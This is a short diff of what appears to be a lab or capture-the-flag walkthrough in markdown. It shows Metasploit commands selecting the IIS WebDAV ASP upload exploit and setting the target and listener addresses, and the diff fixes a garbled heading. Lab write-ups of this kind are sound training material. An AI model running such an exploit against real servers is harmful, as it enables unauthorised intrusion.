@@ -4,7 +4,7 @@
 msf exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
 RHOST => 10.10.10.15
 ```
-**Set LHOST insafe
+**Always set LHOST
 
 ```shell 
 msf exploit(windows/iis/iis_webdav_upload_asp) > set LHOST 10.10.14.11
